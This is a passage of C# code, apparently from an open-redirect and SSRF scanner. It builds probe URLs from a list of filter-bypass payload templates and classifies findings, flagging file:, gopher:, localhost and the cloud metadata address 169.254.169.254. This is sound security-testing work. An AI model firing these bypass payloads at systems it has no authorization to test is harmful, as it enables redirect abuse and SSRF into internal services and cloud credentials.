        yield return $"//{probeHost}/{pathOnly}";

        if (!string.IsNullOrEmpty(querySuffix))
        {
            yield return $"https://{probeHost}/{pathOnly}?{querySuffix}";
            yield return $"//{probeHost}/{pathOnly}?{querySuffix}";
        }

        // strpos("info.php") bypasses — external host with required path segment
        yield return $"https://example.com/{normalized}@{probeHost}/";
        yield return $"/\\{probeHost}/{normalized}";
    }

    private static readonly string[] DefaultBypassTemplates =
    [
        "/\\{PROBE}/",
        "https://{PROBE}@example.com/",
        "https:/{PROBE}/",
        "http://{PROBE}/",
        "/%09/{PROBE}/",
        "//\\{PROBE}/",
        "///{PROBE}/",
        "https://example.com%2f..%2f{PROBE}/",
    ];

    public static string BuildProbeUrl(Uri baseUri, string paramName, string payload)
    {
        var builder = new StringBuilder();
        builder.Append(baseUri.GetLeftPart(UriPartial.Path));
        var query = baseUri.Query.TrimStart('?');
        var first = true;
        if (!string.IsNullOrEmpty(query))
        {
            foreach (var part in query.Split('&', StringSplitOptions.RemoveEmptyEntries))
            {
                var eq = part.IndexOf('=');
                var key = eq >= 0 ? part[..eq] : part;
                if (Uri.UnescapeDataString(key).Equals(paramName, StringComparison.OrdinalIgnoreCase))
                    continue;
                builder.Append(first ? '?' : '&');
                builder.Append(part);
                first = false;
            }
        }

        builder.Append(first ? '?' : '&');
        builder.Append(EscapeQueryParamValue(paramName));
        builder.Append('=');
        builder.Append(EscapeQueryParamValue(payload));
        return builder.ToString();
    }

    /// <summary>Escape query values without double-encoding intentional %XX sequences (e.g. %00 bypass).</summary>
    private static string EscapeQueryParamValue(string value)
    {
        if (string.IsNullOrEmpty(value)) return value;

        var sb = new StringBuilder(value.Length * 3);
        for (var i = 0; i < value.Length; i++)
        {
            if (value[i] == '%' && i + 2 < value.Length &&
                Uri.IsHexDigit(value[i + 1]) && Uri.IsHexDigit(value[i + 2]))
            {
                sb.Append('%').Append(value[i + 1]).Append(value[i + 2]);
                i += 2;
                continue;
            }

            sb.Append(Uri.EscapeDataString(value[i].ToString()));
        }

        return sb.ToString();
    }

    public static string ClassifyBypassTechnique(
        string payload, string? originalValue, string? location, bool filterEvidence = false)
    {
        if (RedirectAnalysis.IsDangerousRedirectScheme(location) ||
            payload.StartsWith("javascript:", StringComparison.OrdinalIgnoreCase) ||
            payload.StartsWith("data:", StringComparison.OrdinalIgnoreCase))
            return "dangerous-scheme";

        if (!string.IsNullOrWhiteSpace(originalValue))
        {
            var norm = originalValue.Trim().TrimStart('/');
            var path = norm.Split('?')[0];
            if (filterEvidence
                && !string.IsNullOrEmpty(path)
                && path.Length >= 3
                && payload.Contains(path, StringComparison.OrdinalIgnoreCase)
                && (payload.Contains("://", StringComparison.Ordinal) || payload.StartsWith("//", StringComparison.Ordinal)))
                return "substring-filter-bypass";

            if (filterEvidence)
            {
                var allowlisted = originalValue.Trim();
                if (allowlisted.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                    allowlisted.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                {
                    var prefix = allowlisted.TrimEnd('/');
                    if (payload.StartsWith(prefix, StringComparison.OrdinalIgnoreCase) &&
                        (payload.Contains('@') || payload.Contains("/../", StringComparison.Ordinal) ||
                         payload.Contains("%00", StringComparison.OrdinalIgnoreCase) ||
                         payload.Contains("%0d", StringComparison.OrdinalIgnoreCase) ||
                         payload.Contains("%23", StringComparison.OrdinalIgnoreCase) ||
                         payload.Contains("%3F", StringComparison.OrdinalIgnoreCase) ||
                         payload.Contains("%2F@", StringComparison.OrdinalIgnoreCase)))
                        return "allowlist-prefix-bypass";
                }
            }
        }

        if (payload.StartsWith("//", StringComparison.Ordinal))
            return "protocol-relative";

        if (filterEvidence
            && (payload.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                payload.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            && (payload.Contains("%00", StringComparison.OrdinalIgnoreCase) ||
                payload.Contains("%0d", StringComparison.OrdinalIgnoreCase) ||
                payload.Contains('@') || payload.Contains("%23", StringComparison.OrdinalIgnoreCase)))
        {
            if (payload.Contains("/../", StringComparison.Ordinal) ||
                payload.Contains("%00", StringComparison.OrdinalIgnoreCase) ||
                payload.Contains('@') || payload.Contains("%23", StringComparison.OrdinalIgnoreCase))
                return "allowlist-prefix-bypass";
        }

        if (payload.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            return "absolute-url";

        return "external-location-redirect";
    }

    public static (string Severity, string Indicator) ClassifyFinding(
        string payload, string? originalValue, string? location, bool ssrfEscalation = false,
        bool filterEvidence = false)
    {
        if (ssrfEscalation)
            return ("high", "ssrf-via-open-redirect");

        if (RedirectAnalysis.IsDangerousRedirectScheme(location) ||
            payload.StartsWith("file:", StringComparison.OrdinalIgnoreCase) ||
            payload.StartsWith("gopher:", StringComparison.OrdinalIgnoreCase) ||
            payload.Contains("127.0.0.1", StringComparison.Ordinal) ||
            payload.Contains("169.254.169.254", StringComparison.Ordinal))
            return ("high", "ssrf-via-open-redirect");

        var technique = ClassifyBypassTechnique(payload, originalValue, location, filterEvidence);
        return technique switch
        {
            "allowlist-prefix-bypass" => ("medium", "allowlist-prefix-bypass"),
            "allowlist-filter-bypass" => ("medium", "allowlist-filter-bypass"),
            "substring-filter-bypass" => ("medium", "substring-filter-bypass"),
            "dangerous-scheme" => ("high", "dangerous-scheme-redirect"),
            _ => ("medium", "external-location-redirect")
        };
    }
}
